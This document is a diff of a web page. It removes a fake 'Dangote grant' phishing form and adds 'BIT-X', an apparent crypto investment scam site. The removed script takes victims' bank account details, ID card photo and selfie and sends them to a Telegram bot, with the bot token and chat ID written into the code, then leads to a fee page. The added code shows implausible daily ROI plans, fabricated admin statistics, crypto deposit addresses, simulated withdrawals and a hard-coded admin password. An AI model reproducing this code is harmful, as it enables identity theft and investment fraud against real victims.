-            <h2 class="serif text-3xl text-dangote font-bold mb-4">Thank You!</h2>
-            <p class="text-gray-600 mb-8 leading-relaxed">Your application is now being processed. Your grant funds will be disbursed into your provided account details in the next <span class="font-bold text-dangote">72 hours</span>.</p>
-            <div class="bg-gray-50 p-4 rounded-xl text-[10px] text-gray-400 uppercase font-bold tracking-widest">Transaction Ref: DG-2026-XQ91</div>
+    <div class="main-content">
+      <div class="topbar">
+        <div style="display:flex;align-items:center;gap:12px;">
+          <button class="menu-toggle" onclick="toggleAdminSidebar()">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+          </button>
+          <div class="topbar-title" id="admin-topbar-title">Admin Overview</div>
         </div>
+        <div class="topbar-right">
+          <div class="topbar-badge" style="background:#FEE2E2;color:var(--danger);">Admin Mode</div>
+        </div>
+      </div>
+
+      <div class="content-area">
+
+        <!-- ADMIN OVERVIEW -->
+        <div id="admin-tab-overview" class="fade-in">
+          <div class="admin-stats">
+            <div class="stat-card"><div class="stat-label">Total Users</div><div class="stat-value">2,418</div><div class="stat-change up">↑ 34 this week</div><div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/></svg></div></div>
+            <div class="stat-card"><div class="stat-label">Total Invested</div><div class="stat-value">$12.4M</div><div class="stat-change up">↑ $840K this month</div><div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 100 7h5a3.5 3.5 0 110 7H6"/></svg></div></div>
+            <div class="stat-card"><div class="stat-label">ROI Paid Out</div><div class="stat-value">$1.8M</div><div class="stat-change up">↑ $240K this month</div><div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg></div></div>
+            <div class="stat-card"><div class="stat-label">Pending Withdrawals</div><div class="stat-value" style="color:var(--warning);">7</div><div class="stat-change" style="color:var(--warning);">⚠ Requires action</div><div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div></div>
+          </div>
+          <div class="two-col">
+            <div class="card">
+              <div class="section-header"><div class="section-title">Recent Signups</div></div>
+              <div class="table-wrap">
+                <table>
+                  <thead><tr><th>Name</th><th>Email</th><th>Plan</th><th>Status</th></tr></thead>
+                  <tbody>
+                    <tr><td>Alice M.</td><td>alice@mail.com</td><td><span class="badge badge-blue">Advanced</span></td><td><span class="badge badge-success">Active</span></td></tr>
+                    <tr><td>Bob K.</td><td>bobk@mail.com</td><td><span class="badge badge-blue">Basic</span></td><td><span class="badge badge-success">Active</span></td></tr>
+                    <tr><td>Chen W.</td><td>chen@mail.com</td><td><span class="badge badge-blue">Premium</span></td><td><span class="badge badge-warning">Pending</span></td></tr>
+                    <tr><td>Diana R.</td><td>diana@mail.com</td><td><span class="badge badge-blue">Elite</span></td><td><span class="badge badge-success">Active</span></td></tr>
+                    <tr><td>Evan S.</td><td>evan@mail.com</td><td><span class="badge badge-blue">Basic</span></td><td><span class="badge badge-danger">Suspended</span></td></tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+            <div class="card">
+              <div class="section-header"><div class="section-title">Plan Distribution</div></div>
+              <div style="display:flex;flex-direction:column;gap:14px;margin-top:8px;">
+                <div><div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:5px;"><span style="font-weight:600;">Basic</span><span style="color:var(--text-soft);">1,102 users (45%)</span></div><div style="background:var(--grey-light);border-radius:4px;height:8px;"><div style="width:45%;height:100%;background:var(--blue);border-radius:4px;"></div></div></div>
+                <div><div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:5px;"><span style="font-weight:600;">Advanced</span><span style="color:var(--text-soft);">847 users (35%)</span></div><div style="background:var(--grey-light);border-radius:4px;height:8px;"><div style="width:35%;height:100%;background:#60A5FA;border-radius:4px;"></div></div></div>
+                <div><div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:5px;"><span style="font-weight:600;">Premium</span><span style="color:var(--text-soft);">363 users (15%)</span></div><div style="background:var(--grey-light);border-radius:4px;height:8px;"><div style="width:15%;height:100%;background:#93C5FD;border-radius:4px;"></div></div></div>
+                <div><div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:5px;"><span style="font-weight:600;">Elite</span><span style="color:var(--text-soft);">106 users (4%)</span></div><div style="background:var(--grey-light);border-radius:4px;height:8px;"><div style="width:4%;height:100%;background:var(--gold);border-radius:4px;"></div></div></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ADMIN USERS -->
+        <div id="admin-tab-users" style="display:none;" class="fade-in">
+          <div class="card">
+            <div class="section-header" style="margin-bottom:16px;"><div class="section-title">All Users</div><button class="btn-primary" style="width:auto;padding:8px 18px;font-size:13px;">+ Add User</button></div>
+            <div class="table-wrap">
+              <table>
+                <thead><tr><th>User</th><th>Email</th><th>Balance</th><th>Plan</th><th>Joined</th><th>Status</th><th>Action</th></tr></thead>
+                <tbody id="admin-users-table"></tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- ADMIN INVESTMENTS -->
+        <div id="admin-tab-investments" style="display:none;" class="fade-in">
+          <div class="card">
+            <div class="section-header" style="margin-bottom:16px;"><div class="section-title">Active Investments</div></div>
+            <div class="table-wrap">
+              <table>
+                <thead><tr><th>User</th><th>Plan</th><th>Amount</th><th>Daily ROI</th><th>Start Date</th><th>End Date</th><th>Status</th></tr></thead>
+                <tbody>
+                  <tr><td>Alice M.</td><td><span class="badge badge-blue">Advanced</span></td><td>$5,000</td><td>$250/day</td><td>May 1, 2025</td><td>Jun 15, 2025</td><td><span class="badge badge-success">Active</span></td></tr>
+                  <tr><td>Bob K.</td><td><span class="badge badge-blue">Basic</span></td><td>$800</td><td>$28/day</td><td>May 5, 2025</td><td>Jun 4, 2025</td><td><span class="badge badge-success">Active</span></td></tr>
+                  <tr><td>Chen W.</td><td><span class="badge badge-blue">Premium</span></td><td>$15,000</td><td>$1,125/day</td><td>Apr 20, 2025</td><td>Jun 19, 2025</td><td><span class="badge badge-success">Active</span></td></tr>
+                  <tr><td>Diana R.</td><td><span class="badge" style="background:#FEF3C7;color:#92400E;">Elite</span></td><td>$75,000</td><td>$9,000/day</td><td>Apr 1, 2025</td><td>Jun 30, 2025</td><td><span class="badge badge-success">Active</span></td></tr>
+                  <tr><td>Frank L.</td><td><span class="badge badge-blue">Basic</span></td><td>$500</td><td>$17.5/day</td><td>May 10, 2025</td><td>Jun 9, 2025</td><td><span class="badge badge-warning">Pending</span></td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- ADMIN WITHDRAWALS -->
+        <div id="admin-tab-withdrawals" style="display:none;" class="fade-in">
+          <div class="card">
+            <div class="section-header" style="margin-bottom:16px;"><div class="section-title">Withdrawal Requests</div><span class="badge badge-warning" style="font-size:12px;padding:5px 12px;">7 Pending</span></div>
+            <div class="table-wrap">
+              <table>
+                <thead><tr><th>User</th><th>Amount</th><th>Crypto</th><th>Wallet</th><th>Date</th><th>Status</th><th>Action</th></tr></thead>
+                <tbody id="admin-withdrawals-table"></tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+      </div>
     </div>
+  </div>
+</div>
 
-    <script>
-        const BOT_TOKEN = "8189651296:AAGr13RJbXiZlGpUOECdDxE-ILjjl_f7Pik";
-        const CHAT_ID = "6577772758";
-        let userData = {};
+<!-- ══════════════════════════════════ MODAL ══════════════════════════════════ -->
+<div class="modal-overlay" id="invest-modal">
+  <div class="modal">
+    <div class="modal-title" id="modal-plan-title">Invest in Basic Plan</div>
+    <div class="modal-sub" id="modal-plan-sub">3.5% daily ROI for 30 days</div>
+    <div class="form-group">
+      <label>Investment Amount (USD)</label>
+      <input type="number" id="modal-amount" placeholder="e.g. 500"/>
+    </div>
+    <div class="form-group">
+      <label>Pay With</label>
+      <select id="modal-crypto">
+        <option>Bitcoin (BTC)</option>
+        <option>Ethereum (ETH)</option>
+        <option>Tether (USDT)</option>
+      </select>
+    </div>
+    <div style="background:var(--offwhite);border-radius:10px;padding:14px;font-size:13px;color:var(--text-soft);">
+      By proceeding, you agree to the BIT-X investment terms. Your deposit address will be shown after confirmation.
+    </div>
+    <div class="modal-actions">
+      <button class="btn-outline" onclick="closeModal()">Cancel</button>
+      <button class="btn-confirm" onclick="confirmInvestment()">Confirm Investment</button>
+    </div>
+  </div>
+</div>
 
-        function navigateTo(pageId) {
-            document.querySelectorAll('.page-container').forEach(p => p.classList.remove('active'));
-            const target = document.getElementById(pageId);
-            target.classList.add('active');
-            target.scrollTop = 0;
-        }
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
 
-        document.getElementById('formStep1').addEventListener('submit', (e) => {
-            e.preventDefault();
-            userData = {
-                name: document.getElementById('name').value,
-                age: document.getElementById('age').value,
-                bank: document.getElementById('bank').value,
-                acc_num: document.getElementById('acc_num').value,
-                acc_name: document.getElementById('acc_name').value
-            };
-            navigateTo('loaderScreen');
-            setTimeout(() => { navigateTo('step2'); }, 10000);
-        });
+<script>
+// ─── STATE ───
+const state = {
+  user: { name:'John Doe', email:'user@bitx.com', balance:5240, roi:840, invested:4000 },
+  isAdmin: false,
+  currentPlan: null,
+};
 
-        document.getElementById('formStep2').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById('finalBtn');
-            const nin = document.getElementById('nin_file').files[0];
-            const selfie = document.getElementById('selfie_file').files[0];
+const txData = [
+  {type:'Deposit',amount:'+$500',crypto:'BTC',date:'May 18, 2025 14:22',status:'Completed'},
+  {type:'ROI Credit',amount:'+$120',crypto:'—',date:'May 17, 2025 08:00',status:'Completed'},
+  {type:'Withdrawal',amount:'-$200',crypto:'USDT',date:'May 15, 2025 11:45',status:'Completed'},
+  {type:'ROI Credit',amount:'+$140',crypto:'—',date:'May 14, 2025 08:00',status:'Completed'},
+  {type:'Deposit',amount:'+$1,000',crypto:'ETH',date:'May 12, 2025 09:33',status:'Completed'},
+  {type:'ROI Credit',amount:'+$105',crypto:'—',date:'May 11, 2025 08:00',status:'Completed'},
+  {type:'Deposit',amount:'+$2,500',crypto:'BTC',date:'May 1, 2025 16:10',status:'Completed'},
+  {type:'Withdrawal',amount:'-$825',crypto:'BTC',date:'Apr 28, 2025 13:22',status:'Pending'},
+];
 
-            btn.innerText = "UPLOADING..."; btn.disabled = true;
+const adminUsers = [
+  {name:'Alice M.',email:'alice@mail.com',balance:'$5,240',plan:'Advanced',joined:'Apr 10',status:'Active'},
+  {name:'Bob K.',email:'bobk@mail.com',balance:'$1,200',plan:'Basic',joined:'May 3',status:'Active'},
+  {name:'Chen W.',email:'chen@mail.com',balance:'$18,900',plan:'Premium',joined:'Mar 22',status:'Active'},
+  {name:'Diana R.',email:'diana@mail.com',balance:'$84,000',plan:'Elite',joined:'Jan 5',status:'Active'},
+  {name:'Evan S.',email:'evan@mail.com',balance:'$320',plan:'Basic',joined:'May 14',status:'Suspended'},
+  {name:'Fatima L.',email:'fatima@mail.com',balance:'$7,650',plan:'Advanced',joined:'Apr 28',status:'Active'},
+];
 
-            const text = `🚨 *DANGOTE GRANT SUBMISSION*\n*Name:* ${userData.name}\n*Bank:* ${userData.bank}\n*Acc:* ${userData.acc_num}`;
+const adminWithdrawals = [
+  {user:'Alice M.',amount:'$500',crypto:'BTC',wallet:'1A1z...vf1',date:'May 18',status:'Pending'},
+  {user:'Bob K.',amount:'$200',crypto:'USDT',wallet:'0x9f2...aa1',date:'May 17',status:'Pending'},
+  {user:'Chen W.',amount:'$2,000',crypto:'ETH',wallet:'0x4c3...bb2',date:'May 17',status:'Approved'},
+  {user:'Diana R.',amount:'$10,000',crypto:'BTC',wallet:'3J9...kL4',date:'May 16',status:'Pending'},
+  {user:'Evan S.',amount:'$150',crypto:'USDT',wallet:'0xAb1...cc3',date:'May 15',status:'Pending'},
+  {user:'Fatima L.',amount:'$750',crypto:'ETH',wallet:'0x77f...dd4',date:'May 15',status:'Approved'},
+  {user:'Frank L.',amount:'$300',crypto:'BTC',wallet:'1FaZ...ee5',date:'May 14',status:'Pending'},
+];
 
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
-                });
+const depositAddresses = {
+  btc:{address:'1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf1',network:'Bitcoin Mainnet',title:'BTC Deposit Address'},
+  eth:{address:'0x742d35Cc6634C0532925a3b8D4C9B65A5fA3829E',network:'Ethereum ERC-20',title:'ETH Deposit Address'},
+  usdt:{address:'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE',network:'TRON TRC-20',title:'USDT Deposit Address'},
+};
 
-                const f1 = new FormData(); f1.append('chat_id', CHAT_ID); f1.append('photo', nin);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f1 });
+// ─── AUTH ───
+function switchAuthTab(tab) {
+  document.querySelectorAll('.auth-tab').forEach((t,i)=>t.classList.toggle('active', (tab==='login'&&i===0)||(tab==='register'&&i===1)));
+  document.getElementById('login-form').style.display = tab==='login'?'block':'none';
+  document.getElementById('register-form').style.display = tab==='register'?'block':'none';
+}
 
-                const f2 = new FormData(); f2.append('chat_id', CHAT_ID); f2.append('photo', selfie);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f2 });
+function doLogin() {
+  const e = document.getElementById('login-email').value;
+  const p = document.getElementById('login-pass').value;
+  if(!e||!p) return showToast('Please fill in all fields','error');
+  state.user.email = e;
+  const name = e.split('@')[0].replace(/\./g,' ').replace(/\b\w/g,c=>c.toUpperCase());
+  state.user.name = name;
+  updateUserUI();
+  showPage('page-dashboard');
+  switchTab('home');
+  showToast('Welcome back, '+name+'! 👋','success');
+}
 
-                navigateTo('postUploadLoader');
-                setTimeout(() => { navigateTo('feePage'); }, 10000);
-            } catch (err) {
-                alert("Network error. Try again."); btn.disabled = false; btn.innerText = "Complete Upload";
-            }
-        });
-    </script>
+function doRegister() {
+  const name = document.getElementById('reg-name').value;
+  const e = document.getElementById('reg-email').value;
+  const p = document.getElementById('reg-pass').value;
+  if(!name||!e||!p) return showToast('Please fill in all fields','error');
+  if(p.length<8) return showToast('Password must be at least 8 characters','error');
+  state.user.name = name; state.user.email = e;
+  updateUserUI();
+  showPage('page-dashboard');
+  switchTab('home');
+  showToast('Account created! Welcome to BIT-X 🎉','success');
+}
+
+function doAdminLogin() {
+  const e = document.getElementById('admin-email').value;
+  const p = document.getElementById('admin-pass').value;
+  if(e==='admin@bitx.com'&&p==='admin123') {
+    state.isAdmin = true;
+    showPage('page-admin');
+    switchAdminTab('overview');
+    buildAdminTables();
+    showToast('Admin access granted','success');
+  } else {
+    showToast('Invalid admin credentials','error');
+  }
+}
+
+function showAdminLogin() { showPage('page-admin-login'); }
+function doLogout() { showPage('page-login'); showToast('Logged out successfully'); }
+
+function updateUserUI() {
+  const initials = state.user.name.split(' ').map(w=>w[0]).join('').toUpperCase().slice(0,2);
+  document.getElementById('user-avatar-init').textContent = initials;
+  document.getElementById('topbar-avatar').textContent = initials;
+  document.getElementById('user-sidebar-name').textContent = state.user.name;
+  document.getElementById('profile-avatar-lg').textContent = initials;
+  document.getElementById('profile-name-display').textContent = state.user.name;
+  document.getElementById('profile-email-display').textContent = state.user.email;
+  document.getElementById('profile-name-input').value = state.user.name;
+  document.getElementById('profile-email-input').value = state.user.email;
+}
+
+// ─── NAVIGATION ───
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+function switchTab(tab) {
+  const tabs = ['home','plans','calculator','deposit','history','profile'];
+  tabs.forEach(t=>{
+    const el = document.getElementById('tab-'+t);
+    if(el) el.style.display = t===tab?'block':'none';
+  });
+  document.querySelectorAll('#main-sidebar .nav-item').forEach(item=>{
+    item.classList.remove('active');
+    if(item.getAttribute('onclick') && item.getAttribute('onclick').includes("'"+tab+"'")) item.classList.add('active');
+  });
+  const titles = {home:'Dashboard',plans:'Investment Plans',calculator:'ROI Calculator',deposit:'Deposit & Withdraw',history:'Transactions',profile:'Profile'};
+  document.getElementById('topbar-title').textContent = titles[tab]||'Dashboard';
+  if(tab==='home') buildMiniChart();
+  if(tab==='history') buildTxTable();
+  if(tab==='calculator') calcROI();
+  closeSidebar();
+}
+
+function switchAdminTab(tab) {
+  const tabs = ['overview','users','investments','withdrawals'];
+  tabs.forEach(t=>{
+    const el = document.getElementById('admin-tab-'+t);
+    if(el) el.style.display = t===tab?'block':'none';
+  });
+  document.querySelectorAll('#admin-sidebar .nav-item').forEach(item=>{
+    item.classList.remove('active');
+    if(item.getAttribute('onclick')&&item.getAttribute('onclick').includes("'"+tab+"'")) item.classList.add('active');
+  });
+  const titles = {overview:'Admin Overview',users:'User Management',investments:'Active Investments',withdrawals:'Withdrawal Requests'};
+  document.getElementById('admin-topbar-title').textContent = titles[tab]||'Admin';
+  closeAdminSidebar();
+}
+
+// ─── SIDEBAR ───
+function toggleSidebar() {
+  document.getElementById('main-sidebar').classList.toggle('open');
+  document.getElementById('sidebar-overlay').classList.toggle('show');
+}
+function closeSidebar() {
+  document.getElementById('main-sidebar').classList.remove('open');
+  document.getElementById('sidebar-overlay').classList.remove('show');
+}
+function toggleAdminSidebar() {
+  document.getElementById('admin-sidebar').classList.toggle('open');
+  document.getElementById('admin-sidebar-overlay').classList.toggle('show');
+}
+function closeAdminSidebar() {
+  document.getElementById('admin-sidebar').classList.remove('open');
+  document.getElementById('admin-sidebar-overlay').classList.remove('show');
+}
+
+// ─── DEPOSIT ───
+function switchDWTab(tab) {
+  document.querySelectorAll('.dw-tab').forEach((t,i)=>t.classList.toggle('active',(tab==='deposit'&&i===0)||(tab==='withdraw'&&i===1)));
+  document.getElementById('dw-deposit-content').style.display = tab==='deposit'?'block':'none';
+  document.getElementById('dw-withdraw-content').style.display = tab==='withdraw'?'block':'none';
+}
+function updateDepositAddress() {
+  const key = document.getElementById('dep-crypto').value;
+  const d = depositAddresses[key];
+  document.getElementById('dep-address').textContent = d.address;
+  document.getElementById('dep-title').textContent = d.title;
+  document.getElementById('dep-network-badge').textContent = d.network;
+  const networkSelect = document.getElementById('dep-network');
+  networkSelect.innerHTML = `<option>${d.network}</option>`;
+}
+function copyAddress() {
+  const addr = document.getElementById('dep-address').textContent;
+  navigator.clipboard.writeText(addr).then(()=>showToast('Address copied to clipboard!','success'));
+}
+function submitWithdraw() { showToast('Withdrawal request submitted! Processing in 1–3 hours.','success'); }
+
+// ─── CALCULATOR ───
+function calcROI() {
+  const [rate,days] = document.getElementById('calc-plan').value.split(',').map(Number);
+  const amount = +document.getElementById('calc-amount').value;
+  document.getElementById('calc-amount-display').textContent = '$'+amount.toLocaleString();
+  const daily = (amount*rate/100);
+  const profit = daily*days;
+  const total = amount+profit;
+  document.getElementById('calc-profit').textContent = '$'+Math.round(profit).toLocaleString();
+  document.getElementById('calc-total-ret').textContent = 'Total return: $'+Math.round(total).toLocaleString();
+  document.getElementById('calc-daily').textContent = '$'+Math.round(daily).toLocaleString();
+  document.getElementById('calc-dur').textContent = days+' days';
+  document.getElementById('calc-rate').textContent = rate+'%';
+  document.getElementById('calc-total-roi').textContent = Math.round(rate*days)+'%';
+}
+
+// ─── MINI CHART ───
+function buildMiniChart() {
+  const container = document.getElementById('mini-chart');
+  if(!container) return;
+  const data = [42,58,51,70,63,80,76];
+  const labels = ['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];
+  const max = Math.max(...data);
+  container.innerHTML = data.map((v,i)=>`
+    <div class="bar-wrap">
+      <div class="bar ${i===data.length-1?'active':''}" style="height:${(v/max)*64}px;"></div>
+      <div class="bar-label">${labels[i]}</div>
+    </div>`).join('');
+}
+
+// ─── TX TABLE ───
+function buildTxTable() {
+  const tbody = document.getElementById('tx-table-body');
+  if(!tbody) return;
+  tbody.innerHTML = txData.map(t=>`
+    <tr>
+      <td><strong>${t.type}</strong></td>
+      <td style="font-family:'Syne',sans-serif;font-weight:700;color:${t.amount.startsWith('+')?'var(--success)':'var(--danger)'};">${t.amount}</td>
+      <td>${t.crypto}</td>
+      <td style="color:var(--text-soft);font-size:12px;">${t.date}</td>
+      <td><span class="badge ${t.status==='Completed'?'badge-success':t.status==='Pending'?'badge-warning':'badge-danger'}">${t.status}</span></td>
+      <td style="color:var(--text-soft);font-size:11px;font-family:monospace;">BX${Math.random().toString(36).substring(2,8).toUpperCase()}</td>
+    </tr>`).join('');
+}
+
+// ─── ADMIN TABLES ───
+function buildAdminTables() {
+  const utable = document.getElementById('admin-users-table');
+  if(utable) utable.innerHTML = adminUsers.map(u=>`
+    <tr>
+      <td><strong>${u.name}</strong></td>
+      <td style="color:var(--text-soft);">${u.email}</td>
+      <td><strong>${u.balance}</strong></td>
+      <td><span class="badge badge-blue">${u.plan}</span></td>
+      <td style="color:var(--text-soft);">${u.joined}</td>
+      <td><span class="badge ${u.status==='Active'?'badge-success':'badge-danger'}">${u.status}</span></td>
+      <td><button onclick="showToast('User actions coming soon')" style="background:none;border:1px solid var(--grey-light);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:12px;color:var(--text-soft);">Edit</button></td>
+    </tr>`).join('');
+
+  const wtable = document.getElementById('admin-withdrawals-table');
+  if(wtable) wtable.innerHTML = adminWithdrawals.map(w=>`
+    <tr>
+      <td><strong>${w.user}</strong></td>
+      <td><strong>${w.amount}</strong></td>
+      <td>${w.crypto}</td>
+      <td style="font-family:monospace;font-size:11px;color:var(--text-soft);">${w.wallet}</td>
+      <td style="color:var(--text-soft);">${w.date}</td>
+      <td><span class="badge ${w.status==='Approved'?'badge-success':'badge-warning'}">${w.status}</span></td>
+      <td style="display:flex;gap:6px;">
+        ${w.status==='Pending'?`<button onclick="approveWithdraw(this,'${w.user}')" style="background:var(--success);color:#fff;border:none;border-radius:6px;padding:4px 10px;cursor:pointer;font-size:11px;font-weight:700;">Approve</button><button onclick="rejectWithdraw(this)" style="background:var(--danger);color:#fff;border:none;border-radius:6px;padding:4px 10px;cursor:pointer;font-size:11px;font-weight:700;">Reject</button>`:'<span style="font-size:12px;color:var(--text-soft);">Done</span>'}
+      </td>
+    </tr>`).join('');
+}
+
+function approveWithdraw(btn, user) {
+  btn.parentElement.innerHTML = '<span style="font-size:12px;color:var(--success);font-weight:700;">✓ Approved</span>';
+  btn.closest('tr').querySelector('.badge').className = 'badge badge-success';
+  btn.closest('tr').querySelector('.badge').textContent = 'Approved';
+  showToast('Withdrawal approved for '+user,'success');
+}
+function rejectWithdraw(btn) {
+  btn.parentElement.innerHTML = '<span style="font-size:12px;color:var(--danger);font-weight:700;">✗ Rejected</span>';
+  btn.closest('tr').querySelector('.badge').className = 'badge badge-danger';
+  btn.closest('tr').querySelector('.badge').textContent = 'Rejected';
+  showToast('Withdrawal rejected','error');
+}
+
+// ─── INVEST MODAL ───
+function openInvestModal(plan,roi,min,max,days) {
+  state.currentPlan = {plan,roi,days};
+  document.getElementById('modal-plan-title').textContent = 'Invest in '+plan+' Plan';
+  document.getElementById('modal-plan-sub').textContent = roi+'% daily ROI for '+days+' days • Min: $'+min+' / Max: $'+max;
+  document.getElementById('invest-modal').classList.add('open');
+}
+function closeModal() { document.getElementById('invest-modal').classList.remove('open'); }
+function confirmInvestment() {
+  const amt = document.getElementById('modal-amount').value;
+  const crypto = document.getElementById('modal-crypto').value;
+  if(!amt||isNaN(amt)||+amt<100) return showToast('Please enter a valid amount (min $100)','error');
+  closeModal();
+  showToast('Investment confirmed! $'+Number(amt).toLocaleString()+' in '+state.currentPlan.plan+' via '+crypto+' 🎉','success');
+  switchTab('deposit');
+}
+
+// ─── PROFILE ───
+function saveProfile() {
+  state.user.name = document.getElementById('profile-name-input').value;
+  state.user.email = document.getElementById('profile-email-input').value;
+  updateUserUI();
+  showToast('Profile updated successfully!','success');
+}
+
+// ─── TOAST ───
+function showToast(msg, type='') {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast'+(type?' '+type:'');
+  setTimeout(()=>t.classList.add('show'),10);
+  setTimeout(()=>t.classList.remove('show'),3200);
+}
+
+// ─── INIT ───
+document.addEventListener('DOMContentLoaded',()=>{
+  buildMiniChart();
+  buildTxTable();
+  updateUserUI();
+});
+</script>
 </body>
 </html>
-
